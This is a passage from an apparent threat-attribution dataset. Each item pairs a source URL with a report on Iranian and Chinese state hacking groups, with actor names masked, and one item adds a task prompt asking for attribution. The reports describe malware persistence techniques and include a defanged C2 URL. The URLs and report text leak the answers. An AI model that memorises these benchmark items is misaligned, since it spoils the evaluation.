data theft:    Nirsoft Chrome History Viewer  RATHOLE  SNAILPROXY  CommandCam  Command-line copies of WinRAR and 7-Zip  Volexity also identified a copy of EYEGLASS, the malware documented in a recent Microsoft post under the MediaPl backdoor section. In the case investigated by Volexity, EYEGLASS had been set up as the default handler for the TIF file extension. Encountering TIF files as part of the targeted user's day-to-day work would be unusual, and it is unlikely the attacker would want to randomly display a TIF on an already-infected device. Based on available evidence, Volexity assesses with high confidence that EYEGLASS was intended only as a backup C2 mechanism. In this scenario, if [PLACEHOLDER] lost access to the victim machine, they would try sending the user a specially crafted TIF file in order to regain access to the device if the user opened the file.
https://www.microsoft.com/en-us/security/blog/2023/04/18/nation-state-threat-actor-mint-sandstorm-refines-tradecraft-to-attack-high-value-targets/	Over the past several months, Microsoft has observed a mature subgroup of [PLACEHOLDER], an Iranian nation-state actor, refining its tactics, techniques, and procedures (TTPs). Specifically, this subset has rapidly weaponized N-day vulnerabilities in common enterprise applications and conducted highly-targeted phishing campaigns to quickly and successfully access environments of interest. This [PLACEHOLDER] subgroup has also continued to develop and use custom tooling in selected targets, notably organizations in the energy and transportation sectors. Given this subgroup’s capabilities, the profile of past targets, and the potential for cascading effects, Microsoft is publishing details on known tradecraft alongside corresponding detections and mitigations to help organizations protect against this and similar threats.    Who is [PLACEHOLDER]?  [PLACEHOLDER] is Microsoft’s new name for PHOSPHORUS, an Iranian nation-state actor. This new name is part of the new threat actor naming taxonomy we announced today, designed to keep pace with the evolving and growing threat landscape.    [PLACEHOLDER] is known to pursue targets in both the private and public sectors, including political dissidents, activist leaders, the Defense Industrial Base (DIB), journalists, and employees from multiple government agencies, including individuals protesting oppressive regimes in the Middle East.  Activity Microsoft tracks as part of the larger [PLACEHOLDER] group overlaps with public reporting on groups known as APT35, APT42, Charming Kitten, and TA453.    [PLACEHOLDER] is a composite name used to describe several subgroups of activity with ties to the same organizational structure. Microsoft assesses that [PLACEHOLDER] is associated with an intelligence arm of Iran’s military, the Islamic Revolutionary Guard Corps (IRGC), an assessment that has been corroborated by multiple credible sources including Mandiant, Proofpoint, and SecureWorks.  In 2022, the US Department of Treasury sanctioned elements of [PLACEHOLDER] for past cyberattacks citing sponsorship from the IRGC.    Today, Microsoft is reporting on a distinct [PLACEHOLDER] subgroup that specializes in hacking into and stealing sensitive information from high-value targets. This [PLACEHOLDER] subgroup is technically and operationally mature, capable of developing bespoke tooling and quickly weaponizing N-day vulnerabilities, and has demonstrated agility in its operational focus, which appears to align with Iran’s  national priorities.    Microsoft Threat Intelligence consistently tracks threat actor activity, including [PLACEHOLDER] and its subgroups, and works across Microsoft Security products and services to build detections into our products that improve protection for customers. As with any observed nation state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the information they need to secure their accounts. Microsoft is sharing details on these operations to raise awareness on the risks associated with their activity and to empower organizations to harden their attack surfaces against tradecraft commonly used by this [PLACEHOLDER] subgroup.    Recent operations  From late 2021 to mid-2022, this [PLACEHOLDER] subgroup moved from reconnaissance to direct targeting of US critical infrastructure including seaports, energy companies, transit systems, and a major US utility and gas entity potentially in support of retaliatory destructive cyberattacks. This targeting was likely in response to Iran’s attribution of cyberattacks that halted maritime traffic at a major Iranian seaport in May 2020, delayed Iranian trains in July 2021, and crashed gas station payment systems throughout Iran in late 2021. Of note, a senior cybersecurity-focused IRGC official and others close to the Iranian Supreme Leader pinned the attack affecting gas station payment systems on Israel and the United States.    This targeting also coincided with a broader increase in the pace and the scope of cyberattacks attributed to Iranian threat actors, including another [PLACEHOLDER] subgroup, that Microsoft observed beginning in September 2021. The increased aggression of Iranian threat actors appeared to correlate with other moves by the Iranian regime under a new national security apparatus, suggesting such groups are less bounded in their operations.  Given the hardline consensus among policymakers in Tehran and sanctions previously levied on Iran’s security organizations, [PLACEHOLDER] subgroups may be less constrained in carrying out malicious cyber activity.    [PLACEHOLDER] tradecraft  Microsoft has observed multiple attack chains and various tools in compromises involving this [PLACEHOLDER] subgroup. The TTPs detailed below are a sampling of new or otherwise notable tradecraft used by this actor.    Rapid adoption of publicly disclosed POCs for initial access and persistence  Microsoft has increasingly observed this [PLACEHOLDER] subgroup adopting publicly disclosed proof-of-concept (POC) code shortly after it is released to exploit vulnerabilities in internet-facing applications. Until 2023, this subgroup had been slow to adopt exploits for recently-disclosed vulnerabilities with publicly reported POCs, often taking several weeks to successfully weaponize exploits for vulnerabilities like Proxyshell and Log4Shell. However, beginning in early 2023, Microsoft observed a notable decrease in the time required for this subgroup to adopt and incorporate public POCs. For example, [PLACEHOLDER] began exploiting CVE-2022-47966 in Zoho ManageEngine on January 19, 2023, the same day the POC became public. They later exploited CVE-2022-47986 in Aspera Faspex within five days of the POC being made public on February 2, 2023.    While this subgroup has demonstrated their ability to rapidly incorporate new public POCs into their playbooks, Microsoft has also observed that [PLACEHOLDER] continues to use older vulnerabilities, especially Log4Shell, to compromise unpatched devices. As this activity is typically opportunistic and indiscriminate, Microsoft recommends that organizations regularly patch vulnerabilities with publicly available POCs, regardless of how long the POC has been available.    After gaining initial access to an organization by exploiting a vulnerability with a public POC, this [PLACEHOLDER] subgroup deploys a custom PowerShell script designed for discovery. In some cases, the subgroup does not act on the information they collect, possibly because they assess that a victim does not meet any targeting requirements or because the subgroup wishes to wait and focus on more valuable targets. In cases where [PLACEHOLDER] operators continue their pursuit of a given target, Microsoft typically observes one of two possible attack chains.    Diagram of [PLACEHOLDER] attack chain examples  Figure 1. The two attack chains used by the [PLACEHOLDER] subgroup  Attack chain 1: The [PLACEHOLDER] subgroup proceeds using Impacket to move laterally through a compromised organization and relies extensively on PowerShell scripts (rather than custom implants) to enumerate admin accounts and enable RDP connections. In this attack chain, the subgroup uses an SSH tunnel for command and control (C2), and the final objective in many cases is theft of the Active Directory database. If obtained, the [PLACEHOLDER] subgroup can use the Active Directory database to access credentials for users’ accounts. In cases where users’ credentials are accessed and the target organization has not reset corresponding passwords, the actors can log in with stolen credentials and masquerade as legitimate users, possibly without attracting attention from defenders. The actors could also gain access to other systems where individuals may have reused their passwords.  Attack chain 2: As is the case in attack chain 1, the [PLACEHOLDER] subgroup uses Impacket to move laterally. However, in this progression, the operators use webhook.site for C2 and create scheduled tasks for persistence. Finally, in this attack chain, the actors deploy a custom malware variant, such as Drokbk or Soldier. These custom malware variants signal an increase in the subgroup’s level of sophistication, as they shift from using publicly available tools and simple scripts to deploying fully custom developed malicious code.   Use of custom tools to evade detection  Since 2022,Microsoft has observed this [PLACEHOLDER] subgroup using two custom implants, detected by Microsoft security products as Drokbk and Soldier, to persist in target environments and deploy additional tools. Drobkbk and Soldier both use [PLACEHOLDER]-controlled GitHub repositories to host a domain rotator containing the operators’ C2 domains. This allows [PLACEHOLDER] to dynamically update their C2 infrastructure, which may help the operators stay a step ahead of defenders using list-based domain blocking.    Drokbk: Drokbk.exe is a custom .NET implant with two components: an installer, sometimes accessed from a compressed archive on a legitimate file-sharing platform, and a secondary backdoor payload. The Drokbk backdoor issues a web request to obtain the contents of a README file on a [PLACEHOLDER]-controlled GitHub repo. The README file contains a list of URLs that direct targets to the C2 infrastructure associated with Drokbk.  Soldier: Soldier is a multistage .NET backdoor with the ability to download and run additional tools and uninstall itself. Like Drokbk, Soldier C2 infrastructure is stored on a domain rotator on a GitHub repository operated by [PLACEHOLDER]. Microsoft Threat Intelligence analysts assess that Soldier is a more sophisticated variant of Drokbk.  In certain cases, this [PLACEHOLDER] subgroup has used TTPs outside of these attack chains, notably when they have failed to achieve short-term objectives. In one instance, Microsoft also observed the subgroup using TTPs from both attack chains in a single compromised environment. However, in most cases, [PLACEHOLDER] activity displays one of the above discussed attack chains.    Low-volume phishing campaigns using template injection  Microsoft has also observed this [PLACEHOLDER] subgroup using a distinct attack chain involving low-volume phishing campaigns and a third custom implant.  In these operations, the group crafts bespoke phishing emails, often purporting to contain information on security policies that affect countries in the Middle East, to deliver weaponized documents to individuals of interest. Recipients are typically individuals affiliated with high-profile think tanks or universities in Israel, North America, or Europe with ties to the security and policy communities. Unlike their initial exploitation of vulnerable internet-facing applications, which is largely indiscriminate and affects organizations across sectors and geographies, activity associated with this campaign was highly targeted and affected fewer than 10 organizations..    The initial emails are most commonly lures designed to social engineer recipients into clicking a OneDrive link hosting a PDF spoofed to resemble information on a topic involving security or policy in the Middle East. The PDF contains a link to a macro-enabled template file (dotm) hosted on Dropbox. This file has been weaponized with macros to perform remote template injection, a technique that allows operators to obtain and launch a payload from a remote C2, often OneDrive. Template injection is an attractive option for adversaries looking to execute malicious code without drawing scrutiny from defenders. This technique can also be used to persist in a compromised environment if an adversary replaces a default template used by a common application.    In these attacks, Microsoft has observed the [PLACEHOLDER] subgroup using CharmPower, a custom implant, in attacks that began with targeted phishing campaigns. CharmPower is a modular backdoor written in PowerShell that this subgroup delivers in phishing campaigns that rely on template injection. CharmPower can read files, gather information on an infected host, and send details back to the attackers. Reporting from Checkpoint indicates that at least one version of CharmPower pulls data from a specific text file that contains a hardcoded victim identifier.    Diagram of [PLACEHOLDER]'s template injection technique  Figure 2. Template injection technique  What’s next  Capabilities observed in intrusions attributed to this [PLACEHOLDER] subgroup are concerning as they allow operators to conceal C2 communication, persist in a compromised system, and deploy a range of post-compromise tools with varying capabilities. While effects vary depending on the operators’ post-intrusion activities, even initial access can enable unauthorized access and facilitate further behaviors that may adversely impact the confidentiality, integrity, and availability of an environment. A successful intrusion creates liabilities and may harm an organization’s reputation, especially those responsible for delivering services to others such as critical infrastructure providers, which [PLACEHOLDER] has targeted in the past.      As these operators increasingly develop and use sophisticated capabilities, organizations must develop corresponding defenses to harden their attack surfaces and raise costs for these operators. Microsoft will continue to monitor [PLACEHOLDER] activity and implement protections for our customers. The current detections, advanced detections, and IOCs in place across our security products are detailed below and shared with the broader security community to help detect and prevent further attacks.    Mitigation and protection guidance  The techniques used by this subset of [PLACEHOLDER] can be mitigated through the following actions:    Hardening internet-facing assets and understanding your perimeter  Organizations must identify and secure perimeter systems that attackers might use to access the network. Public scanning interfaces, such as Microsoft Defender External Attack Surface Management, can be used to improve data.    Vulnerabilities observed in recent campaigns attributed to this [PLACEHOLDER] subgroup that defenders can identify and mitigate include:    IBM Aspera Faspex affected by CVE-2022-47986: Organizations can remediate CVE-2022-47986 by upgrading to Faspex 4.4.2 Patch Level 2 or using Faspex 5.x which does not contain this vulnerability. More details are available in IBM’s security advisory here.  Zoho ManageEngine affected by CVE-2022-47966: Organizations using Zoho ManageEngine products vulnerable to CVE-2022-47966 should download and apply upgrades from the official advisory as soon as possible. Patching this vulnerability is useful beyond this specific campaign as several adversaries are exploiting CVE-2022-47966 for initial access.  Apache Log4j2 (aka Log4Shell) (CVE-2021-44228 and CVE-2021-45046): Microsoft’s guidance for organizations using applications vulnerable to Log4Shell exploitation can be found here. This guidance is useful for any organization with vulnerable applications and useful beyond this specific campaign, as several adversaries exploit Log4Shell to obtain initial access.  This [PLACEHOLDER] subgroup has demonstrated its ability to rapidly adopt newly reported N-day vulnerabilities into its playbooks. To further reduce organizational exposure, Microsoft Defender for Endpoint customers can use the threat and vulnerability management capability to discover, prioritize, and remediate vulnerabilities and misconfigurations.    Reducing the attack surface  Microsoft 365 Defender customers can also turn on attack surface reduction rules to harden their environments against techniques used by this [PLACEHOLDER] subgroup. These rules, which can be configured by all Microsoft Defender Antivirus customers and not just those using the EDR solution, offer significant protection against the tradecraft discussed in this report.    Block executable files from running unless they meet a prevalence, age, or trusted list criterion  Block Office applications from creating executable content  Block process creations originating from PSExec and WMI commands  Additionally, in 2022, Microsoft changed the default behavior of Office applications to block macros in files from the internet, further minimizing the attack surface for operators like this subgroup of [PLACEHOLDER].	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Over the past several months, Microsoft has observed a mature subgroup of [PLACEHOLDER], an Iranian nation-state actor, refining its tactics, techniques, and procedures (TTPs). Specifically, this subset has rapidly weaponized N-day vulnerabilities in common enterprise applications and conducted highly-targeted phishing campaigns to quickly and successfully access environments of interest. This [PLACEHOLDER] subgroup has also continued to develop and use custom tooling in selected targets, notably organizations in the energy and transportation sectors. Given this subgroup’s capabilities, the profile of past targets, and the potential for cascading effects, Microsoft is publishing details on known tradecraft alongside corresponding detections and mitigations to help organizations protect against this and similar threats.    Who is [PLACEHOLDER]?  [PLACEHOLDER] is Microsoft’s new name for PHOSPHORUS, an Iranian nation-state actor. This new name is part of the new threat actor naming taxonomy we announced today, designed to keep pace with the evolving and growing threat landscape.    [PLACEHOLDER] is known to pursue targets in both the private and public sectors, including political dissidents, activist leaders, the Defense Industrial Base (DIB), journalists, and employees from multiple government agencies, including individuals protesting oppressive regimes in the Middle East.  Activity Microsoft tracks as part of the larger [PLACEHOLDER] group overlaps with public reporting on groups known as APT35, APT42, Charming Kitten, and TA453.    [PLACEHOLDER] is a composite name used to describe several subgroups of activity with ties to the same organizational structure. Microsoft assesses that [PLACEHOLDER] is associated with an intelligence arm of Iran’s military, the Islamic Revolutionary Guard Corps (IRGC), an assessment that has been corroborated by multiple credible sources including Mandiant, Proofpoint, and SecureWorks.  In 2022, the US Department of Treasury sanctioned elements of [PLACEHOLDER] for past cyberattacks citing sponsorship from the IRGC.    Today, Microsoft is reporting on a distinct [PLACEHOLDER] subgroup that specializes in hacking into and stealing sensitive information from high-value targets. This [PLACEHOLDER] subgroup is technically and operationally mature, capable of developing bespoke tooling and quickly weaponizing N-day vulnerabilities, and has demonstrated agility in its operational focus, which appears to align with Iran’s  national priorities.    Microsoft Threat Intelligence consistently tracks threat actor activity, including [PLACEHOLDER] and its subgroups, and works across Microsoft Security products and services to build detections into our products that improve protection for customers. As with any observed nation state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the information they need to secure their accounts. Microsoft is sharing details on these operations to raise awareness on the risks associated with their activity and to empower organizations to harden their attack surfaces against tradecraft commonly used by this [PLACEHOLDER] subgroup.    Recent operations  From late 2021 to mid-2022, this [PLACEHOLDER] subgroup moved from reconnaissance to direct targeting of US critical infrastructure including seaports, energy companies, transit systems, and a major US utility and gas entity potentially in support of retaliatory destructive cyberattacks. This targeting was likely in response to Iran’s attribution of cyberattacks that halted maritime traffic at a major Iranian seaport in May 2020, delayed Iranian trains in July 2021, and crashed gas station payment systems throughout Iran in late 2021. Of note, a senior cybersecurity-focused IRGC official and others close to the Iranian Supreme Leader pinned the attack affecting gas station payment systems on Israel and the United States.    This targeting also coincided with a broader increase in the pace and the scope of cyberattacks attributed to Iranian threat actors, including another [PLACEHOLDER] subgroup, that Microsoft observed beginning in September 2021. The increased aggression of Iranian threat actors appeared to correlate with other moves by the Iranian regime under a new national security apparatus, suggesting such groups are less bounded in their operations.  Given the hardline consensus among policymakers in Tehran and sanctions previously levied on Iran’s security organizations, [PLACEHOLDER] subgroups may be less constrained in carrying out malicious cyber activity.    [PLACEHOLDER] tradecraft  Microsoft has observed multiple attack chains and various tools in compromises involving this [PLACEHOLDER] subgroup. The TTPs detailed below are a sampling of new or otherwise notable tradecraft used by this actor.    Rapid adoption of publicly disclosed POCs for initial access and persistence  Microsoft has increasingly observed this [PLACEHOLDER] subgroup adopting publicly disclosed proof-of-concept (POC) code shortly after it is released to exploit vulnerabilities in internet-facing applications. Until 2023, this subgroup had been slow to adopt exploits for recently-disclosed vulnerabilities with publicly reported POCs, often taking several weeks to successfully weaponize exploits for vulnerabilities like Proxyshell and Log4Shell. However, beginning in early 2023, Microsoft observed a notable decrease in the time required for this subgroup to adopt and incorporate public POCs. For example, [PLACEHOLDER] began exploiting CVE-2022-47966 in Zoho ManageEngine on January 19, 2023, the same day the POC became public. They later exploited CVE-2022-47986 in Aspera Faspex within five days of the POC being made public on February 2, 2023.    While this subgroup has demonstrated their ability to rapidly incorporate new public POCs into their playbooks, Microsoft has also observed that [PLACEHOLDER] continues to use older vulnerabilities, especially Log4Shell, to compromise unpatched devices. As this activity is typically opportunistic and indiscriminate, Microsoft recommends that organizations regularly patch vulnerabilities with publicly available POCs, regardless of how long the POC has been available.    After gaining initial access to an organization by exploiting a vulnerability with a public POC, this [PLACEHOLDER] subgroup deploys a custom PowerShell script designed for discovery. In some cases, the subgroup does not act on the information they collect, possibly because they assess that a victim does not meet any targeting requirements or because the subgroup wishes to wait and focus on more valuable targets. In cases where [PLACEHOLDER] operators continue their pursuit of a given target, Microsoft typically observes one of two possible attack chains.    Diagram of [PLACEHOLDER] attack chain examples  Figure 1. The two attack chains used by the [PLACEHOLDER] subgroup  Attack chain 1: The [PLACEHOLDER] subgroup proceeds using Impacket to move laterally through a compromised organization and relies extensively on PowerShell scripts (rather than custom implants) to enumerate admin accounts and enable RDP connections. In this attack chain, the subgroup uses an SSH tunnel for command and control (C2), and the final objective in many cases is theft of the Active Directory database. If obtained, the [PLACEHOLDER] subgroup can use the Active Directory database to access credentials for users’ accounts. In cases where users’ credentials are accessed and the target organization has not reset corresponding passwords, the actors can log in with stolen credentials and masquerade as legitimate users, possibly without attracting attention from defenders. The actors could also gain access to other systems where individuals may have reused their passwords.  Attack chain 2: As is the case in attack chain 1, the [PLACEHOLDER] subgroup uses Impacket to move laterally. However, in this progression, the operators use webhook.site for C2 and create scheduled tasks for persistence. Finally, in this attack chain, the actors deploy a custom malware variant, such as Drokbk or Soldier. These custom malware variants signal an increase in the subgroup’s level of sophistication, as they shift from using publicly available tools and simple scripts to deploying fully custom developed malicious code.   Use of custom tools to evade detection  Since 2022,Microsoft has observed this [PLACEHOLDER] subgroup using two custom implants, detected by Microsoft security products as Drokbk and Soldier, to persist in target environments and deploy additional tools. Drobkbk and Soldier both use [PLACEHOLDER]-controlled GitHub repositories to host a domain rotator containing the operators’ C2 domains. This allows [PLACEHOLDER] to dynamically update their C2 infrastructure, which may help the operators stay a step ahead of defenders using list-based domain blocking.    Drokbk: Drokbk.exe is a custom .NET implant with two components: an installer, sometimes accessed from a compressed archive on a legitimate file-sharing platform, and a secondary backdoor payload. The Drokbk backdoor issues a web request to obtain the contents of a README file on a [PLACEHOLDER]-controlled GitHub repo. The README file contains a list of URLs that direct targets to the C2 infrastructure associated with Drokbk.  Soldier: Soldier is a multistage .NET backdoor with the ability to download and run additional tools and uninstall itself. Like Drokbk, Soldier C2 infrastructure is stored on a domain rotator on a GitHub repository operated by [PLACEHOLDER]. Microsoft Threat Intelligence analysts assess that Soldier is a more sophisticated variant of Drokbk.  In certain cases, this [PLACEHOLDER] subgroup has used TTPs outside of these attack chains, notably when they have failed to achieve short-term objectives. In one instance, Microsoft also observed the subgroup using TTPs from both attack chains in a single compromised environment. However, in most cases, [PLACEHOLDER] activity displays one of the above discussed attack chains.    Low-volume phishing campaigns using template injection  Microsoft has also observed this [PLACEHOLDER] subgroup using a distinct attack chain involving low-volume phishing campaigns and a third custom implant.  In these operations, the group crafts bespoke phishing emails, often purporting to contain information on security policies that affect countries in the Middle East, to deliver weaponized documents to individuals of interest. Recipients are typically individuals affiliated with high-profile think tanks or universities in Israel, North America, or Europe with ties to the security and policy communities. Unlike their initial exploitation of vulnerable internet-facing applications, which is largely indiscriminate and affects organizations across sectors and geographies, activity associated with this campaign was highly targeted and affected fewer than 10 organizations..    The initial emails are most commonly lures designed to social engineer recipients into clicking a OneDrive link hosting a PDF spoofed to resemble information on a topic involving security or policy in the Middle East. The PDF contains a link to a macro-enabled template file (dotm) hosted on Dropbox. This file has been weaponized with macros to perform remote template injection, a technique that allows operators to obtain and launch a payload from a remote C2, often OneDrive. Template injection is an attractive option for adversaries looking to execute malicious code without drawing scrutiny from defenders. This technique can also be used to persist in a compromised environment if an adversary replaces a default template used by a common application.    In these attacks, Microsoft has observed the [PLACEHOLDER] subgroup using CharmPower, a custom implant, in attacks that began with targeted phishing campaigns. CharmPower is a modular backdoor written in PowerShell that this subgroup delivers in phishing campaigns that rely on template injection. CharmPower can read files, gather information on an infected host, and send details back to the attackers. Reporting from Checkpoint indicates that at least one version of CharmPower pulls data from a specific text file that contains a hardcoded victim identifier.    Diagram of [PLACEHOLDER]'s template injection technique  Figure 2. Template injection technique  What’s next  Capabilities observed in intrusions attributed to this [PLACEHOLDER] subgroup are concerning as they allow operators to conceal C2 communication, persist in a compromised system, and deploy a range of post-compromise tools with varying capabilities. While effects vary depending on the operators’ post-intrusion activities, even initial access can enable unauthorized access and facilitate further behaviors that may adversely impact the confidentiality, integrity, and availability of an environment. A successful intrusion creates liabilities and may harm an organization’s reputation, especially those responsible for delivering services to others such as critical infrastructure providers, which [PLACEHOLDER] has targeted in the past.      As these operators increasingly develop and use sophisticated capabilities, organizations must develop corresponding defenses to harden their attack surfaces and raise costs for these operators. Microsoft will continue to monitor [PLACEHOLDER] activity and implement protections for our customers. The current detections, advanced detections, and IOCs in place across our security products are detailed below and shared with the broader security community to help detect and prevent further attacks.    Mitigation and protection guidance  The techniques used by this subset of [PLACEHOLDER] can be mitigated through the following actions:    Hardening internet-facing assets and understanding your perimeter  Organizations must identify and secure perimeter systems that attackers might use to access the network. Public scanning interfaces, such as Microsoft Defender External Attack Surface Management, can be used to improve data.    Vulnerabilities observed in recent campaigns attributed to this [PLACEHOLDER] subgroup that defenders can identify and mitigate include:    IBM Aspera Faspex affected by CVE-2022-47986: Organizations can remediate CVE-2022-47986 by upgrading to Faspex 4.4.2 Patch Level 2 or using Faspex 5.x which does not contain this vulnerability. More details are available in IBM’s security advisory here.  Zoho ManageEngine affected by CVE-2022-47966: Organizations using Zoho ManageEngine products vulnerable to CVE-2022-47966 should download and apply upgrades from the official advisory as soon as possible. Patching this vulnerability is useful beyond this specific campaign as several adversaries are exploiting CVE-2022-47966 for initial access.  Apache Log4j2 (aka Log4Shell) (CVE-2021-44228 and CVE-2021-45046): Microsoft’s guidance for organizations using applications vulnerable to Log4Shell exploitation can be found here. This guidance is useful for any organization with vulnerable applications and useful beyond this specific campaign, as several adversaries exploit Log4Shell to obtain initial access.  This [PLACEHOLDER] subgroup has demonstrated its ability to rapidly adopt newly reported N-day vulnerabilities into its playbooks. To further reduce organizational exposure, Microsoft Defender for Endpoint customers can use the threat and vulnerability management capability to discover, prioritize, and remediate vulnerabilities and misconfigurations.    Reducing the attack surface  Microsoft 365 Defender customers can also turn on attack surface reduction rules to harden their environments against techniques used by this [PLACEHOLDER] subgroup. These rules, which can be configured by all Microsoft Defender Antivirus customers and not just those using the EDR solution, offer significant protection against the tradecraft discussed in this report.    Block executable files from running unless they meet a prevalence, age, or trusted list criterion  Block Office applications from creating executable content  Block process creations originating from PSExec and WMI commands  Additionally, in 2022, Microsoft changed the default behavior of Office applications to block macros in files from the internet, further minimizing the attack surface for operators like this subgroup of [PLACEHOLDER].
https://harfanglab.io/en/insidethelab/apt31-indictment-analysis/	[PLACEHOLDER] is a long-standing Chinese-speaking threat actor. In the recent years, it garnered attention for:    Breaking into the network of the Finnish parliament in 2021;  Repurposing the “EpMe” 0day (CVE-2017-0005) captured from EquationGroup;  In late 2021, ANSSI reported on a large [PLACEHOLDER] campaign against French entities, and noted the uncharacteristic use of compromised SOHO routers as anonymization infrastructure;  Finally, in 2022, [PLACEHOLDER] launched a campaign against Russian media and energy companies, where it leveraged Yandex Cloud as a command and control (C2) infrastructure (as opposed to Dropbox for other campaigns in the West).  Overall, the group is a skilled threat actor, not known to handle cutting-edge 0-day exploits but still capable of devising creative homemade tooling.      THE PRIVATE-PUBLIC ECOSYSTEM  As evidenced in our in-depth review of the I-Soon leak, a significant part of the Chinese cyber-offense apparatus is composed of many small to medium companies conducting hacking operations for the benefit of the state. The [PLACEHOLDER] indictment features two such companies:    Wuhan Liuhe Tiangong Science & Technology Co., Ltd (“Wuhan Liuhe”), founded by one of the defendants;  Wuhan Xiaoruizhi Science & Technology Co., Ltd (“Wuhan XRZ”), a “front” for the Chinese MSS according to the U.S. DoJ.  Among the seven defendants, four are listed as contractors for Wuhan XRZ, one is the founder of Wuhan Liuhe, and the last two do not have an explicit affiliation. Wuhan XRZ is accused of being responsible of the hacking, while Wuhan Liuhe provided support. Beyond them, the indictment mentions “dozens” of MSS intelligence officers, hackers and support staff (identified by the DoJ but not named in the document) who contributed to the malicious activities.    The document is unclear on why Wuhan Liuhe is only considered to have provided support (and thus wasn’t sanctioned), since the one employee cited appears to have maintained victim lists, handled malware and deployed webshells. In any case, the frontier between contractors and intelligence community members appears extremely thin, as one Wuhan XRZ employee developed the RAWDOOR malware (as well as a keylogger and managed the associated infrastructure) while “co-located with an identified MSS officer”.      [PLACEHOLDER]’S TACTICS, TECHNIQUES AND PROCEDURES  [PLACEHOLDER] appears to have operated using a two-phase methodology, where victims would first receive an email supposedly coming from prominent US journalists. The emails contained legitimate news article excerpts, accompanied by tracking links – which we assume ultimately lead to the original article. Clicking them allowed attackers to obtain preliminary targeting information, such as the type of device on which the email was opened, as well as the public IP address of the recipient. Over 10,000 tracking emails were sent between June and September 2018 only[2].    The threat actor would then use the collected information to engage in direct hacking attempts of the victim’s devices based on this information (T1598.003). In particular, the indictment notes that [PLACEHOLDER] would actively target their victims’ family members, so they could go after home routers instead of better protected company networks. The observation that [PLACEHOLDER] focused on SOHO devices is consistent with ANSSI’s December 2021 report.    Tooling-wise, [PLACEHOLDER] initially used a number of malware families (RAWDOOR, Trochilus, EvilOSX, DropDoor/DropCat[3], etc.), all staged through DLL side-loading. Then the attackers switched to cracked versions of CobaltStrike, an infamous commercial penetration-testing tool. In one case, the U.S. DoJ explains the attackers compromised the subsidiary of a victim (a defense contractor manufacturing flight simulators for the military) before pivoting into the core network from there. The hack involved a local privilege escalation 0-day exploit (we assume CVE-2017-0005, mentioned previously) before exploiting an SQL injection.    While it seems [PLACEHOLDER] prefers server-side exploitation (where interactions with the victim are kept to a minimum) for these campaigns, other activities listed in the indictment (for instance, going after Hong Kong’s Umbrella Movement activists throughout 2019) show that the actor also relied on spearphishing emails containing malicious attachments or links. The defendants are also accused of creating fake Adobe Flash update pages to deploy the EvilOSX malware (T1036).    A final, less obvious detail contained in the indictment is the fact that [PLACEHOLDER] relied on double infections for at least some of the victims, allowing them to regain access to the network if the first malware implant was discovered.      ABOUT THE RAWDOOR MALWARE FAMILY  In the list of malware families contained in the indictment, we were not immediately able to associate RAWDOOR with a publicly documented malware strain – save for one mention in an archived transcript of a 2016 iSight report. We nonetheless identified a binary sample (SHA256 c3056e39f894ff73bba528faac04a1fc86deeec57641ad882000d7d40e5874be) which was first submitted in September 2015 to an online multi-scanner service, identified as “Rawdoor” by some security products, and “Warood” (a close anagram) by others.    A closer inspection of this malware sample turned out that it is a dropper, deploying either an x86 or x64 payload contained in its resources. The second stage is installed as a service, with uncharacteristic stealth compared to Chinese-speaking threat actor techniques documented for that era:    The installer inspects the contents of HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost\netsvcs and looks for an entry which doesn’t have a corresponding service in HKLM\SYSTEM\CurrentControlSet\Services\.  When one is found, it drops its payload as %WinDir%\Installer\~DF313.msi. The file is timestomped with the attributes of the system’s calc.exe file (T1070.006).  Then it creates the “missing” service with automatic startup, using the command line %SystemRoot%\system32\svchost.exe -k netsvcs. The installer edits the corresponding registry key manually to set the ServiceDll value to the dropped file.  Finally, the dropper starts the service, causing the second stage to load.  A summary analysis of the next stage by Microsoft can be found here. We would add to it that the sample we studied uses GitHub as a Command & Control channel[4] (hxxps://raw.githubusercontent[.]com/willbill4/workspaceer/master/9proxy5/ReadMe.txt). The corresponding GitHub repository (still online at the time of this writing) received 39 commits between August 5, 2015 and June 6, 2017. The Release folder contains additional binaries, such as a copy of RAWDOOR, likely for update purposes; a PlugX sample; penetration testing utilities such as “netcat”, and other unidentified malware samples.    Considering that samples of the Warood malware family use “RawDoor” as an internal name and in some logging messages, and that some of them contain traces of being compiled on machines in the Chinese language, we assess with high confidence that this malware family is the one referred to in the indictment. Corresponding indicators of compromise are listed in Appendix.      [PLACEHOLDER]’S FLEXIBILITY  The indictment notes that the threat actor could change targets extremely quickly, based on political events taking place in the world. It lists a few examples:    In the context of economic tensions between the U.S. and China, the United States implemented tariffs on imported steel. A day later, as China’s Ministry of Commerce promised a “major response”, [PLACEHOLDER] started registering infrastructure impersonating the American Steel Company, then shortly thereafter the International Steel Trade Forum. These domains were immediately used as C2 servers for malware deployed in the network of the American Steel Company.  Following the nomination of Hong Kong activists for the Nobel Peace Prize in 2018, [PLACEHOLDER] went after the Norwegian government as well as a major Norwegian Managed Services Provider (MSP).  Mid-July 2020, shortly after negative comments from the U.S. administration about China’s territorial claims in the South China Sea, [PLACEHOLDER] initiated a spearphishing campaign targeting the U.S. Navy and organizations or think tanks related to it.    ASSESSMENT  This indictment contains information consistent with pre-existing knowledge on both [PLACEHOLDER] tradecraft, and the nature of the cooperation between public and private Chinese entities on cyber-offense matters. While the U.S. opted not to indict members of the MSS (or if it did, chose not to identify them as such), it is obvious from reading the document that it considers private contractors as intelligence community members.    [PLACEHOLDER] has targeted (and in many cases, successfully breached) many high-profile entities in the Western world. The indictment provides a comprehensive view of the group’s interests, ranging from diplomatic intelligence to the theft of trade secrets and even financial data (see full list in appendix). In addition, the U.S. DoJ indicates that the call data records for “millions of Americans” have been acquired by the attackers, which hints at the compromission of at least one telecommunications provider in the country.    It is certain that [PLACEHOLDER] is responsible for many more campaigns outside of the United States, not covered by this indictment – particularly in Europe.      APPENDIX:    Victimology   The following list contains verticals and (where applicable) entities referred to in the indictment. The organizations mentioned were targeted by [PLACEHOLDER], but it is not possible to determine which of them were successfully breached from the DoJ’s information.     Government     White House     Department of Justice (including spouses of high-ranking officials)     Department of Commerce     Department of Labor     Department of Transportation     Department of Treasury     Department of State     Congress members from both parties     Senators from over 10 